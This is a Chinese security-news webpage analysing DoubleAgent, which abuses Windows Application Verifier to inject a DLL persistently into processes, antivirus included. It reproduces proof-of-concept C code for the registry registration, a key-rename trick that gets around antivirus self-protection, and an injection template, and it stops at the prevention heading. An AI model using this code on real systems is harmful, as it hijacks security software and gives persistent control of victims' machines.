@@ -1,0 +1,818 @@
+﻿<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <title>零日漏洞DoubleAgent的代码注入和持久性攻击技术分析 - 嘶吼 RoarTalk &#8211; 回归最本质的信息安全,互联网安全新媒体,4hou.com</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="renderer" content="webkit">
+    <meta property="wb:webmaster" content="4517e8fe39b18975" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,Chrome=1" />
+    <meta name="description" content="近日Cybellum的安全专家发现了一种新型的零日漏洞病毒，该病毒会在攻击计算机前先破坏杀毒软件，Cybellum的安全专家将这种攻击手段命名为 DoubleAgent。 DoubleAgent通过向杀毒软件注入代码从而修改杀毒软件的进程…" />
+    <meta name="keywords" content="漏洞分析" />
+        <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon.ico" rel="shortcut icon">
+    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_114.png" rel="apple-touch-icon">
+    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_76.png" sizes="76x76" rel="apple-touch-icon">
+    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_120.png" sizes="120x120" rel="apple-touch-icon">
+    <link href="http://img.4hou.com/wp-content/themes/4houv2/images/favicon_152.png" sizes="152x152" rel="apple-touch-icon">
+
+    <!-- 引入 lib -->
+    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/jquery.min.js"></script>
+    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/swiper.jquery.min.js"></script>
+    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/lib/swiper.min.css">
+    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/lib/allmin.css">
+    <!--[if lt IE 11]>
+    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/html5shiv.min.js"></script>
+    <script src="http://www.4hou.com/wp-content/themes/4houv2/lib/respond.js"></script>
+    <![endif]-->
+    <!-- 引入 css js -->
+    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/css/style.css">
+    <link rel="stylesheet" href="http://www.4hou.com/wp-content/themes/4houv2/lib/allmin.css">
+    <script src="http://www.4hou.com/wp-content/themes/4houv2/js/public.js"></script>
+    <script src="http://www.4hou.com/wp-content/themes/4houv2/js/main.js"></script>
+    <script src="http://www.4hou.com/wp-content/themes/4houv2/js/index-more.js"></script>
+    </head>
+<body>
+<style type="text/css">
+.memberlistanimate{width: 122px}
+.memberlistanimateleave{width: 122px}
+.nameheader{overflow:hidden;text-overflow:ellipsis;white-space:nowrap;width: 78px;display: block;}
+</style>
+
+<header class="header">
+            <article class="header_center">
+                <div class="logowrap">
+            <a href="http://www.4hou.com"><div class="logo icons"></div></a>
+            <h1>回归最本质的信息安全</h1>
+        </div>
+        <div class="login">
+            <form action="/" class="navbar-form inSearch " name="searchform" onsubmit="return checksubmit()">
+                <div class="br">
+                    <span class="in-btn icons"></span>
+                    <input type="text" name="s" id="search" class="animated">
+                    <div class="clear icons"></div>
+                </div>
+                <div id="submitBtnplace" class="icons animated" value=""></div>
+                <!--<input type="submit" id="submitBtn" class="icons animated" value="">-->
+            </form>
+                            <!--登录注册按钮-->
+                 <div id="register">
+                     <a href="http://www.4hou.com/register" data-event-category="Referral to Signup" data-event-action="click" data-event-label="Signup Menu button / Header">注册</a>
+                 </div>
+                 <div id="sing">
+                      <a href="http://www.4hou.com/login" class="pzh_login">登录</a>
+                 </div>
+
+                 <div class="burger2 menu" id="burger">
+                  <div class="icon"></div>
+                 </div>
+
+            
+           <!-- <div id="register">注册</div>
+            <div id="sing">登录</div>
+            <div class="burger2 menu" id="burger">
+                <div class="icon"></div>
+            </div>-->
+        </div>
+    </article>
+</header>
+<nav class="navbox animated">
+    <section class="navbox_cen">
+        <article class="navboxleft">
+            <ul class="nav navbar-nav index-nav" id="inNav">
+					<li>
+							<li class="cat-item cat-item-18"><a href="http://www.4hou.com/category/info" >资讯</a>
+</li>
+	<li class="cat-item cat-item-19"><a href="http://www.4hou.com/category/technology" >技术</a>
+</li>
+	<li class="cat-item cat-item-20"><a href="http://www.4hou.com/category/xactivity" >活动</a>
+</li>
+	<li class="cat-item cat-item-29"><a href="http://www.4hou.com/category/vulnerable" >漏洞</a>
+</li>
+					</li>
+                    <li class="cat-item cat-item-29"><a href="http://www.4hou.com/piao" >嘶票</a>
+                    </li>
+            </ul>
+        </article>
+        <article class="navboxright">
+            <div class="contrib"> <a href="http://www.4hou.com/contribute" class="tougao" data-event-category="Referral to Signup" data-event-action="click" data-event-label="Signup Menu button / Header">投稿</a></div>
+        </article>
+    </section>
+</nav>
+<div id="modelbg"></div>
+    <style>
+
+
+    ::selection {
+    background:#fea283;
+    color:#fff;
+}
+::-moz-selection {
+    background:#fea283;
+    color:#fff;
+}
+::-webkit-selection {
+    background:#fea283;
+    color:#fff;
+}
+
+
+        .article_cen p img{height: auto !important;}
+        .commentlist .children{width: 90%; padding-right: 15px; border-color: transparent ;}
+        .commentname,.commenteml{width: 60%; margin-left:5% ;margin-bottom: 30px;border-bottom: 1px solid #dbdbdb;}
+        .article_cen ol li{list-style-type: decimal;}
+         .article_cen ol li p{overflow: inherit;}
+        .commentname label{font-size: 16px;color: #666; margin-right: 10px;line-height: 32px;}
+        .commentname input{width: 50%;border: none; outline: none;}
+        .commenteml label{font-size: 16px;color: #666; margin-right: 10px;line-height: 32px;}
+        .commenteml input{width: 50%;border: none; outline: none;}
+        #zooming{display: none;width: 100%;height: 100%; position: fixed;z-index: 999;left: 0px; top: 0px; background-color: rgba(0,0,0,.6);}
+        .zoomaniatae{display: block !important;}
+        .imgcon{}
+        #imgcon{position: absolute;left: 50%; top: 20%;max-width: 80%}
+        .article_cen img{cursor: pointer;}
+        #zooming{cursor: pointer;}
+        .imgconadimate{animation:imgcon 0.5s 1 forwards;
+        -webkit-animation:imgcon 0.5s 1 forwards;}
+        .article_authorbox{    width: 222px;min-height: 214px;
+        padding-bottom: 20px;
+        float: right;
+        position: relative;}
+        .interested{position: relative;}
+        .interested>h1{font-size: 18px; font-weight: 900; position: absolute; top: -36px;color: #5e5e5e}
+       .user-comment span{font-size: 13px; position: relative; top: 2px;}
+        .article_authoradd{position: fixed;}
+        .stratend{background:url(http://www.4hou.com/wp-content/themes/4houv2/img/starend.png); !important;background-size: contain !important;}
+        .wpfp-span{opacity: 0;width:100%; height: 100%;display: block; left: 0px; top: 0px; }
+        .wpfp-link{width:100%; height: 100%;display: block; left: 0px; top: 0px; }
+        .wpfp-span img{display: none;}
+        .interested{width: 222px;padding-bottom: 20px;background-color: #fff;margin-top: 70px; padding-bottom: 10px; padding-top: 10px;border: 1px solid #f5c2b1}
+        .interested li{width: 100%;position: relative;padding-top: 8px; padding-bottom: 8px;  line-height: 24px; padding-left: 20px;padding-right: 14px}
+        .interested li i{width: 6px;height: 6px;border-radius: 50%; background-color: #f63;position: absolute; left: 8px; top: 18px;}
+        .interested li a{color: #666;font-size: 14px; line-height: 18px;}
+        .interested li:hover{background-color: #f9e7e3;-moz-transition: all 0.4s ease-in-out;
+        .footer{position: relative;z-index: 99}   
+        .article_authorbox_top{position: relative;} 
+        
+
+        -o-transition: all 0.4s ease-in-out; -webkit-transition: all 0.4s ease-in-out; transition: all 0.4s ease-in-out;}
+    
+        @-webkit-keyframes imgcon{
+            0%{ opacity:0; -webkit-transform:scale3d(.3, .3, .3); transform:scale3d(.3, .3, .3) }
+            50%{ opacity:1 }
+        }
+        @keyframes imgcon{
+            0%{ opacity:0; -webkit-transform:scale3d(.3, .3, .3); transform:scale3d(.3, .3, .3) }
+            50%{ opacity:1 }
+        }
+        .asideanimate{animation:asideanimate 1s 1 forwards;
+        -webkit-animation:asideanimate 1s 1 forwards; position: fixed;}
+        @-webkit-keyframes asideanimate{
+            0%{ opacity:0; -webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
+            50%{ opacity:1 }
+        }
+        @keyframes asideanimate{
+            0%{ opacity:0; -webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
+            50%{ opacity:1 }
+        }
+        .asideanimateleave{animation:asideanimateleave 1s 1 forwards;
+        -webkit-animation:asideanimateleave 1s 1 forwards;}
+        @-webkit-keyframes asideanimateleave{
+            0%{ opacity:1; -webkit-transform:translate3d(0,0, 0); transform:translate3d(0, 0, 0) }
+            50%{ opacity:0;-webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
+        }
+        @keyframes asideanimateleave{
+            0%{ opacity:1; -webkit-transform:translate3d(0,0, 0); transform:translate3d(0, 0, 0) }
+            50%{ opacity:0;-webkit-transform:translate3d(0,-20%, 0); transform:translate3d(0, -20%, 0) }
+        }
+        @media screen and (max-width:650px) {
+            .member_list{right: -30px !important;top: 34px !important;}
+            .article_authorbox{display: none;}
+            .nameheader{display: none;}
+            .shang_box{width: 90%; margin-left:-45% }
+            #imgcon{width: 90% !important; margin-left: -45% !important;max-width: inherit !important}
+            .dy{padding: 12px 15px!important;font-size: 14px !important; line-height: 22px !important;}
+        }
+        .article_author{float:none !important;padding-top: 1px;}
+        .article_cen pre{color: #666 !important; line-height: 26px; background-color: #f1f1f1}
+        .articlecontent blockquote>p{ color: #666; font-size: 16px; }
+    </style>
+    <section class="articlewrap">
+        <article class="articlecontent">
+            <div class="article_top">
+                <h1 class="art_title">零日漏洞DoubleAgent的代码注入和持久性攻击技术分析</h1>
+                <p class="art_time">2017年4月1日发布</p>
+                <div class="art_nav">
+                    <!--<a href="">翻译文章</a>
+                    <span>／</span>
+                    <a href="">新闻</a>
+                    <span>／</span>
+                    <a href="">原创</a>-->
+                                        <a href="http://www.4hou.com">首页 </a></a>
+                    <span>／</span>
+                    <a href="http://www.4hou.com/category/technology">技术</a>
+                    <span>／</span>
+                    <a href="">正文</a>
+
+                    </ul>
+                </div>
+                <div class="art_type">
+                    <div class="newtype">
+                        <div class="read ">
+                            <i class="icons"></i>
+                            <span>6,021</span>
+                        </div>
+                        <div class="comment ">
+                            <i class="icons"></i>
+                            <span>1</span>
+                        </div>
+                        <div class="Praise">
+                            <i class="icons"></i>
+                            <span>0</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+             <p class="dy" style="padding: 24px 60px;font-size: 16px;line-height: 30px;color: #808080;background-color: #f6f6f6;"><span style="font-weight: bold;">导语：</span>DoubleAgent通过向杀毒软件注入代码从而修改杀毒软件的进程，进而获得设备的完整权限来对用户进行攻击。</p>
+
+            <div class="article_cen">
+                <!--文章摘要-->
+               
+                <p><p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170331/1490942892706684.jpg" title="1490942892706684.jpg" alt="1490942892706684.jpg" width="630" height="675" border="0" vspace="0" style="width: 630px; height: 675px;"/><noscript><img src="/uploads/20170331/1490942892706684.jpg" title="1490942892706684.jpg" alt="1490942892706684.jpg" width="630" height="675" border="0" vspace="0" style="width: 630px; height: 675px;"/></noscript></p>
+<p>近日Cybellum的安全专家发现了一种新型的零日漏洞病毒，该病毒会在攻击计算机前先破坏杀毒软件，Cybellum的安全专家将这种攻击手段命名为 DoubleAgent。 DoubleAgent通过向杀毒软件注入代码从而修改杀毒软件的进程，进而获得设备的完整权限来对用户进行攻击。</p>
+<p>DoubleAgent利用了存在于Microsoft Application Verifier（应用程序检验器）的漏洞，目前确认的受影响的设备包括：</p>
+<pre class="brush:html;toolbar:false">1.从XP到Windows&nbsp;10的所有Windows&nbsp;版本都受到了影响，
+2.含有x86和x64的Windows架构都受到了影响，
+3.Windows的SYSTEM&nbsp;和&nbsp;Admin&nbsp;用户都受到了影响，
+4.含有OS及Antivirus特权进程的Windows设备都受到了影响，</pre>
+<p>也就是说DoubleAgent利用了存在于Microsoft Application Verifier的一个15年的漏洞，而且这种攻击是建立在一个合法进程之上，因此目前我们还无法对其进行修复。</p>
+<p><span style="font-size: 20px;"><strong>代码注入</strong></span></p>
+<p>据Cybellum介绍，DoubleAgent通过将一个叫做“verifier provider DLL”的文件加载到目标应用程序的进程程中。</p>
+<p>一旦加载完成，该DLL将作为指定进程的程序DLL添加到Windows注册表。随后Windows会自动以该DLL注册名将代码注入到所有进程中，这个机制使得DoubleAgent能够获得高执行权限，从而允许DoubleAgent执行特权来注册一个恶意的代码进程，将代码注入到杀毒软件，并劫持其代理。</p>
+<p>这个攻击方法适用于任何进程了，一旦恶意软件劫持了杀毒软件，它可能会滥用其进行各种恶意操作，包括更改杀毒软件的白名单或黑名单、在应用程序中安装后门程序、劫持用户数据、将其传播到其他设备、进行加密或删除文件（即勒索软件的行为）。</p>
+<p>另外代码注入在进程启动过程中发生得非常早，从而使攻击者完全控制进程，并且无法让进程进行自我保护。总而言之，这种代码注入技术非常独特，不会被任何杀毒软件检测到或阻止。</p>
+<p><span style="font-size: 20px;"><strong>实施持久性攻击</strong></span></p>
+<p>Cybellum还指出，即便采取了重新启动、更新、重新安装或修补程序等行为，攻击也很难被阻止，DoubleAgent还可以继续注入代码。一旦攻击者将代码注入到一个进程中，则这个进程将永远被强制绑定。</p>
+<p><span style="font-size: 20px;"><strong>攻击范围</strong></span></p>
+<p>1.DoubleAgent的攻击据称影响到诸多安全厂商，包括Avast, AVG, Avira, Bitdefender, Comodo, ESET, F-Secure, Kaspersky, Malwarebytes, McAfee, Norton, Panda, Quick Heal 和 Trend Micro。</p>
+<p>2.DoubleAgent可以在操作系统启动后自动执行。</p>
+<p>3.DoubleAgent可以劫持现有可信进程的权限，从而伪装成受信任的进程以执行恶意操作。</p>
+<p>4.DoubleAgent可以更改执行流程，例如安装后门、削弱加密算法等。</p>
+<p>5.DoubleAgent通过向其他用户和会话控制的进程中注入代码，将其传播到其他设备。</p>
+<p><span style="font-size: 20px;"><strong>攻击技术还原</strong></span></p>
+<p><strong>利用Microsoft Application Verifier的漏洞</strong></p>
+<p>DoubleAgent通过一个叫做“verifier provider DLL”的文件加载到应用程序的进程中。</p>
+<p>验证者提供的代码只是一个被加载到进程中并负责执行应用程序运行验证的，为了注册一个新的应用程序验证代码，验证者需要为验证程序提供程序代码并通过在注册表中创建一组密钥（a set of keys）来注册它。</p>
+<p>一旦将代码注册为进程的验证程序，即使在重新启动、更新、重新安装、修补程序等之后，Windows Loader也会永久注入到进程中。</p>
+<p><strong>注册</strong></p>
+<p>应用程序验证者会根据可执行文件名称进行注册，这意味着每个代码都被绑定到一个特定的可执行文件名称，并且还将被注入到注册过的进程名称启动后的每个进程。</p>
+<p>例如把DoubleAgentDll.dll注册到cmd.exe并启动，“C：/cmd.exe”和“C：/Windows/System32/cmd.exe”在注册后，会将DoubleAgentDll.dll注入到这两个进程中。</p>
+<p>注册后，每当使用注册名称创建新进程时，操作系统会自动执行注入。无论是rebootsupdatesreinstallspatches还是其它，注入都会一直发生。每次创建具有注册名称的新进程时，DoubleAgent都将与应用程序验证一起注入。</p>
+<p>可以使用Cybellum公开的DoubleAgent项目来注册新的应用验证，请点击<a href="https://github.com/Cybellum/DoubleAgent" target="_self">这儿</a>。</p>
+<pre class="brush:html;toolbar:false">Usage:&nbsp;&nbsp;DoubleAgent.exe&nbsp;installuninstallrepair&nbsp;process_name
+e.g.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;DoubleAgent.exe&nbsp;install&nbsp;cmd.exe</pre>
+<p>或者使用验证器模块将注册功能集成到现有项目中，请点击<a href="https://github.com/Cybellum/DoubleAgent/blob/master/DoubleAgent/Verifier.h" target="_self">这儿</a>。</p>
+<pre class="brush:html;toolbar:false">/*
+&nbsp;*&nbsp;Installs&nbsp;an&nbsp;application&nbsp;verifier&nbsp;for&nbsp;the&nbsp;process
+&nbsp;*/
+DOUBLEAGENT_STATUS&nbsp;VERIFIER_Install(IN&nbsp;PCWSTR&nbsp;pcwszProcessName,&nbsp;IN&nbsp;PCWSTR&nbsp;pcwszVrfDllName,&nbsp;IN&nbsp;PCWSTR&nbsp;pcwszVrfDllPathX86,&nbsp;IN&nbsp;PCWSTR&nbsp;pcwszVrfDllPathX64);
+/*
+&nbsp;*&nbsp;In&nbsp;some&nbsp;cases&nbsp;(application&nbsp;crash,&nbsp;exception,&nbsp;etc.)&nbsp;the&nbsp;installuninstall&nbsp;functions&nbsp;may&nbsp;accidentally&nbsp;leave&nbsp;the&nbsp;machine&nbsp;in&nbsp;an&nbsp;undefined&nbsp;state
+&nbsp;*&nbsp;Repairs&nbsp;the&nbsp;machine&nbsp;to&nbsp;its&nbsp;original&nbsp;state
+&nbsp;*/
+DOUBLEAGENT_STATUS&nbsp;VERIFIER_Repair(VOID);
+/*
+&nbsp;*&nbsp;Uninstalls&nbsp;the&nbsp;application&nbsp;verifier&nbsp;from&nbsp;the&nbsp;process
+&nbsp;*/
+VOID&nbsp;VERIFIER_Uninstall(IN&nbsp;PCWSTR&nbsp;pcwszProcessName,&nbsp;IN&nbsp;PCWSTR&nbsp;pcwszVrfDllName);</pre>
+<p>在后台，注册过程创建了两个新的注册表项：</p>
+<p>HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/PROCESS_NAME</p>
+<pre class="brush:html;toolbar:false">/*&nbsp;Creates&nbsp;the&nbsp;VerifierDlls&nbsp;value&nbsp;and&nbsp;sets&nbsp;it&nbsp;to&nbsp;the&nbsp;verifier&nbsp;dll&nbsp;name&nbsp;*/
+bCreatedVerifierDlls&nbsp;=&nbsp;(ERROR_SUCCESS&nbsp;==&nbsp;RegSetKeyValueW(hIfeoKey,&nbsp;pcwszProcessName,&nbsp;VERIFIER_VERIFIERDLLS_VALUE_NAME,&nbsp;REG_SZ,&nbsp;pcwszVrfDllName,&nbsp;dwVrfDllNameLenInBytes));
+/*
+&nbsp;*&nbsp;Creates&nbsp;the&nbsp;GlobalFlag&nbsp;value&nbsp;and&nbsp;sets&nbsp;it&nbsp;to&nbsp;FLG_APPLICATION_VERIFIER
+&nbsp;*&nbsp;Read&nbsp;more:&nbsp;https://msdn.microsoft.com/en-us/library/windows/hardware/ff542875(v=vs.85).aspx
+&nbsp;*/
+bCreatedGlobalFlag&nbsp;=&nbsp;(ERROR_SUCCESS&nbsp;==&nbsp;RegSetKeyValueW(hIfeoKey,&nbsp;pcwszProcessName,&nbsp;VERIFIER_GLOBALFLAG_VALUE_NAME,&nbsp;REG_DWORD,</pre>
+<pre class="brush:html;toolbar:false">&amp;amp;dwGlobalFlag,&nbsp;sizeof(dwGlobalFlag)));</pre>
+<p>最终结果如下：</p>
+<p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170331/1490943207352369.png" title="1490943207352369.png" alt="1.png"/><noscript><img src="/uploads/20170331/1490943207352369.png" title="1490943207352369.png" alt="1.png"/></noscript></p>
+<p>某些杀毒软件试图通过阻止DoubleAgent修改密钥的方法来保护“Image File Execution Options”下的进程。例如杀毒软件可能会尝试阻止访问“Image File Execution Options/ANTIVIRUS_NAME”的任何尝试。</p>
+<p>但是DoubleAgent只需要通过略微修改注册表路径，就可以轻松地绕过这些简单的保护措施。例如绕过“ “Image File Execution Options/ANTIVIRUS_NAME” 的访问，DoubleAgen首先将“Image File Execution Options”重命名为“Image File Execution Options Temp”等新的临时名称，在“Image File Execution Options TempANTIVIRUS_NAME”下创建新的注册表项，然后将“Image File Execution Options”重命名为其原始名称。</p>
+<p>因为新的密钥的创建发生在“Image File Execution Options TempANTIVIRUS_NAME”而不是“Image File Execution Options/ANTIVIRUS_NAME”之下，所以DoubleAgent足以绕过杀毒软件的自我保护。</p>
+<p>Cybellum的研究人员通过对几款杀毒软件的注册表项进行安全保护性测试后发现，所有这些杀毒软件都被使用了“Rename Technique”的DoubleAgent绕过。</p>
+<p>在“Rename Technique”技术实现后，就可以实现代码注入了：</p>
+<pre class="brush:html;toolbar:false">/*&nbsp;Creates&nbsp;the&nbsp;VerifierDlls&nbsp;value&nbsp;and&nbsp;sets&nbsp;it&nbsp;to&nbsp;the&nbsp;verifier&nbsp;dll&nbsp;name&nbsp;*/
+bCreatedVerifierDlls&nbsp;=&nbsp;(ERROR_SUCCESS&nbsp;==&nbsp;RegSetKeyValueW(hIfeoKey,&nbsp;pcwszProcessName,&nbsp;VERIFIER_VERIFIERDLLS_VALUE_NAME,&nbsp;REG_SZ,&nbsp;pcwszVrfDllName,&nbsp;dwVrfDllNameLenInBytes));
+/*
+&nbsp;*&nbsp;Creates&nbsp;the&nbsp;GlobalFlag&nbsp;value&nbsp;and&nbsp;sets&nbsp;it&nbsp;to&nbsp;FLG_APPLICATION_VERIFIER
+&nbsp;*&nbsp;Read&nbsp;more:&nbsp;https://msdn.microsoft.com/en-us/library/windows/hardware/ff542875(v=vs.85).aspx
+&nbsp;*/
+bCreatedGlobalFlag&nbsp;=&nbsp;(ERROR_SUCCESS&nbsp;==&nbsp;RegSetKeyValueW(hIfeoKey,&nbsp;pcwszProcessName,&nbsp;VERIFIER_GLOBALFLAG_VALUE_NAME,&nbsp;REG_DWORD,&nbsp;&amp;amp;dwGlobalFlag,&nbsp;sizeof(dwGlobalFlag)));
+/*
+&nbsp;*&nbsp;The&nbsp;key&nbsp;creation&nbsp;might&nbsp;fail&nbsp;because&nbsp;some&nbsp;antiviruses&nbsp;protect&nbsp;the&nbsp;keys&nbsp;of&nbsp;their&nbsp;processes&nbsp;under&nbsp;the&nbsp;IFEO
+&nbsp;*&nbsp;One&nbsp;possible&nbsp;bypass&nbsp;is&nbsp;to&nbsp;rename&nbsp;the&nbsp;IFEO&nbsp;key&nbsp;name&nbsp;to&nbsp;a&nbsp;temporary&nbsp;name,&nbsp;create&nbsp;the&nbsp;keys,&nbsp;and&nbsp;restores&nbsp;the&nbsp;IFEO&nbsp;key&nbsp;name
+&nbsp;*/
+if&nbsp;((FALSE&nbsp;==&nbsp;bCreatedVerifierDlls)&nbsp;||&nbsp;(FALSE&nbsp;==&nbsp;bCreatedGlobalFlag))
+{
+/*&nbsp;Renames&nbsp;the&nbsp;IFEO&nbsp;key&nbsp;name&nbsp;to&nbsp;a&nbsp;temporary&nbsp;name&nbsp;*/
+if&nbsp;(ERROR_SUCCESS&nbsp;!=&nbsp;RegRenameKey(hIfeoKey,&nbsp;NULL,&nbsp;VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_NAME_TEMP))
+{
+DOUBLEAGENT_SET(eStatus,&nbsp;DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGRENAMEKEY_FAILED);
+goto&nbsp;lbl_cleanup;
+}
+bKeyRenamed&nbsp;=&nbsp;TRUE;
+/*
+&nbsp;*&nbsp;Opens&nbsp;the&nbsp;temporary&nbsp;IFEO&nbsp;key
+&nbsp;*&nbsp;The&nbsp;key&nbsp;is&nbsp;reopened&nbsp;because&nbsp;some&nbsp;antiviruses&nbsp;continue&nbsp;monitoring&nbsp;and&nbsp;blocking&nbsp;the&nbsp;handle&nbsp;that&nbsp;opened&nbsp;the&nbsp;original&nbsp;IFEO
+&nbsp;*/
+if&nbsp;(ERROR_SUCCESS&nbsp;!=&nbsp;RegOpenKeyExW(HKEY_LOCAL_MACHINE,&nbsp;VERIFIER_IMAGE_FILE_EXECUTION_OPTIONS_SUB_KEY_TEMP,&nbsp;0,&nbsp;KEY_SET_VALUE&nbsp;|&nbsp;KEY_WOW64_64KEY,&nbsp;&amp;amp;hIfeoKeyTemp))
+{
+DOUBLEAGENT_SET(eStatus,&nbsp;DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGOPENKEYEXW_FAILED_TEMP_IFEO);
+goto&nbsp;lbl_cleanup;
+}
+if&nbsp;(FALSE&nbsp;==&nbsp;bCreatedVerifierDlls)
+{
+/*&nbsp;Tries&nbsp;again&nbsp;to&nbsp;create&nbsp;the&nbsp;VerifierDlls&nbsp;value&nbsp;*/
+if&nbsp;(ERROR_SUCCESS&nbsp;!=&nbsp;RegSetKeyValueW(hIfeoKeyTemp,&nbsp;pcwszProcessName,&nbsp;VERIFIER_VERIFIERDLLS_VALUE_NAME,&nbsp;REG_SZ,&nbsp;pcwszVrfDllName,&nbsp;dwVrfDllNameLenInBytes))
+{
+DOUBLEAGENT_SET(eStatus,&nbsp;DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGSETKEYVALUEW_FAILED_VERIFIERDLLS);
+goto&nbsp;lbl_cleanup;
+}
+bCreatedVerifierDllsTemp&nbsp;=&nbsp;TRUE;
+}
+if&nbsp;(FALSE&nbsp;==&nbsp;bCreatedGlobalFlag)
+{
+/*&nbsp;Tries&nbsp;again&nbsp;to&nbsp;create&nbsp;the&nbsp;GlobalFlag&nbsp;value&nbsp;*/
+if&nbsp;(ERROR_SUCCESS&nbsp;!=&nbsp;RegSetKeyValueW(hIfeoKeyTemp,&nbsp;pcwszProcessName,&nbsp;VERIFIER_GLOBALFLAG_VALUE_NAME,&nbsp;REG_DWORD,&nbsp;&amp;amp;dwGlobalFlag,&nbsp;sizeof(dwGlobalFlag)))
+{
+DOUBLEAGENT_SET(eStatus,&nbsp;DOUBLEAGENT_STATUS_DOUBLEAGENT_VERIFIER_REGISTER_REGSETKEYVALUEW_FAILED_GLOBALFLAG);
+goto&nbsp;lbl_cleanup;
+}
+bCreatedGlobalFlagTemp&nbsp;=&nbsp;TRUE;
+}
+}</pre>
+<p><strong>注入</strong></p>
+<p>操作系统会通过调用ntdll的LdrInitializeThunk 来控制内核到用户的传输模式，这样每个进程都将启动。启动后，ntdll会负责初始化过程（初始化全局变量，加载导入等），并最终将控制转移到执行程序：</p>
+<p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170331/1490943301588902.png" title="1490943301588902.png" alt="6.png"/><noscript><img src="/uploads/20170331/1490943301588902.png" title="1490943301588902.png" alt="6.png"/></noscript></p>
+<p>该过程处于初始阶段，唯一加载的模块是ntdll.dll和可执行文件（NS.exe）：</p>
+<p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170331/1490943308982103.png" title="1490943308982103.png" alt="7.png"/><noscript><img src="/uploads/20170331/1490943308982103.png" title="1490943308982103.png" alt="7.png"/></noscript></p>
+<p>当ntdll的LdrpInitializeProcess中的大部分初始化发生时，Ntdll也会开始初始化进程：</p>
+<p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170331/1490943314832479.png" title="1490943314832479.png" alt="8.png"/><noscript><img src="/uploads/20170331/1490943314832479.png" title="1490943314832479.png" alt="8.png"/></noscript></p>
+<p>通常第一个被加载的DLL将是kernel32.dll。</p>
+<p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170331/1490943322564417.png" title="1490943322564417.png" alt="9.png"/><noscript><img src="/uploads/20170331/1490943322564417.png" title="1490943322564417.png" alt="9.png"/></noscript></p>
+<p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170331/1490943329590779.png" title="1490943329590779.png" alt="10.png"/><noscript><img src="/uploads/20170331/1490943329590779.png" title="1490943329590779.png" alt="10.png"/></noscript></p>
+<p>但是，如果应用程序验证已经打开ntdll的LdrpInitializeProcess调用ntdll的AVrfInitializeVerifier，那这会导致程序DLL在加载kernel32之前加载：</p>
+<p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170331/1490943345122640.png" title="1490943345122640.png" alt="11.png"/><noscript><img src="/uploads/20170331/1490943345122640.png" title="1490943345122640.png" alt="11.png"/></noscript></p>
+<p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170331/1490943352425046.png" title="1490943352425046.png" alt="12.png"/><noscript><img src="/uploads/20170331/1490943352425046.png" title="1490943352425046.png" alt="12.png"/></noscript></p>
+<p>初始阶段，在任何其他系统dll之前，研究人员是可以绝对控制这个过程的：</p>
+<p style="text-align: center"><img src="http://img.4hou.com/wp-content/themes/4houv2/img/lazy.gif" data-original="/uploads/20170331/1490943367411831.png" title="1490943367411831.png" alt="13.png"/><noscript><img src="/uploads/20170331/1490943367411831.png" title="1490943367411831.png" alt="13.png"/></noscript></p>
+<p>一旦研究人员的DLL由ntdll加载，则DllMain将被调用，研究人员就可以自由地按照所希望的方式在用户进程中进行任意控制狂：</p>
+<pre class="brush:html;toolbar:false">static&nbsp;BOOL&nbsp;main_DllMainProcessAttach(VOID)
+{
+DOUBLEAGENT_STATUS&nbsp;eStatus&nbsp;=&nbsp;DOUBLEAGENT_STATUS_INVALID_VALUE;
+/*
+&nbsp;**************************************************************************
+&nbsp;Enter&nbsp;Your&nbsp;Code&nbsp;Here
+&nbsp;**************************************************************************
+&nbsp;*/
+&nbsp;/*&nbsp;Succeeded&nbsp;*/
+DOUBLEAGENT_SET(eStatus,&nbsp;DOUBLEAGENT_STATUS_SUCCESS);
+/*&nbsp;Returns&nbsp;status&nbsp;*/
+return&nbsp;FALSE&nbsp;!=&nbsp;DOUBLEAGENT_SUCCESS(eStatus);
+}</pre>
+<p><span style="font-size: 20px;"><strong>DoubleAgent的预防</strong></span></p>
